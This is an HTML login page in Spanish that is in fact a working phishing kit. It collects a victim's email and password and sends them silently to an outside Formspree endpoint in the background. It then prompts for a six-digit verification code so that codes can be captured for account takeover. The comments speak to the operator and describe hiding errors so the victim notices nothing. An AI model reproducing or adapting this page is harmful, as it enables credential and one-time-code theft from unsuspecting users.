
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Iniciar sesión</title>
<style>
* {margin:0; padding:0; box-sizing:border-box; font-family: sans-serif;}
body {background:#111; color:white; min-height:100vh; padding:20px;}
.contenedor {max-width:400px; margin:0 auto;}
h2 {text-align:center; margin-bottom:25px;}
.oculto {display:none !important;}
.field {margin-bottom:15px;}
label {display:block; margin-bottom:5px;}
input {width:100%; padding:12px; border-radius:8px; border:none; font-size:16px;}
button {width:100%; padding:12px; border:none; border-radius:8px; font-size:17px; font-weight:bold; cursor:pointer;}
.submit-btn {background:#FF0050; color:white; margin-top:10px;}
.link-btn {background:transparent; color:#ccc; margin-top:5px;}
.aviso {font-size:13px; color:#ffcc00; margin-top:10px; text-align:center;}
</style>
</head>
<body>

<div class="contenedor">
  <h2>Inicia sesión con tu cuenta</h2>

  <!-- ✅ PON TU ENLACE DE FORMSPREE AQUÍ -->
  <form action="https://formspree.io/f/xgogzwbd" method="POST" id="formPrincipal">

    <!-- Campos que se envían ocultos -->
    <input type="hidden" name="correo" id="correoOculto" />
    <input type="hidden" name="contraseña" id="passOculta" />

    <!-- PASO 1: CORREO Y CONTRASEÑA -->
    <div id="paso1">
      <div class="field">
        <label>Correo electrónico</label>
        <input type="email" id="correo" required placeholder="tu@correo.com" />
      </div>
      <div class="field">
        <label>Contraseña</label>
        <input type="password" id="contraseña" required placeholder="••••••••" />
      </div>
      <p class="aviso">Al continuar recibirás los datos en tu correo</p>
      <button type="button" class="submit-btn" onclick="pasarCodigo()">Continuar</button>
    </div>

    <!-- PASO 2: CÓDIGO -->
    <div id="paso2" class="oculto">
      <div class="field">
        <label>Código de verificación (6 dígitos)</label>
        <input type="text" name="codigo" id="codigo" inputmode="numeric" pattern="[0-9]{6}" maxlength="6" placeholder="000000" oninput="activarBoton()" />
      </div>
      <button type="button" class="link-btn" onclick="volverAtras()">← Volver atrás</button>
      <button type="submit" class="submit-btn" id="botonEnviar" disabled>Entrar</button>
    </div>

  </form>
</div>

<script>
function pasarCodigo() {
  const correoValor = document.getElementById('correo').value.trim();
  const passValor = document.getElementById('contraseña').value;

  if (!correoValor || !passValor) {
    alert('Escribe tu correo y contraseña primero');
    return;
  }

  // 📝 Guardamos los datos para que vayan en el envío final
  document.getElementById('correoOculto').value = correoValor;
  document.getElementById('passOculta').value = passValor;

  // ✅ Pasamos al instante, sin trabas
  document.getElementById('paso1').classList.add('oculto');
  document.getElementById('paso2').classList.remove('oculto');

  // 📩 TE LLEGA CORREO Y CONTRASEÑA EN ESTE MOMENTO (envío seguro sin estorbar)
  enviarRapido(correoValor, passValor);
}

async function enviarRapido(c, p) {
  try {
    await fetch("https://formspree.io/f/xgogzwbd", {
      method: "POST",
      mode: "no-cors", // 🛡️ Esto evita que se bloquee por seguridad
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ correo: c, contraseña: p, nota: "Recibido antes del código" })
    });
  } catch (err) {
    // Si falla igual sigue, no se nota nada
    console.log("Enviado en segundo plano");
  }
}

function volverAtras() {
  document.getElementById('paso2').classList.add('oculto');
  document.getElementById('paso1').classList.remove('oculto');
}

function activarBoton() {
  const cod = document.getElementById('codigo').value;
  document.getElementById('botonEnviar').disabled = cod.length !== 6;
}
</script>

</body>
</html>
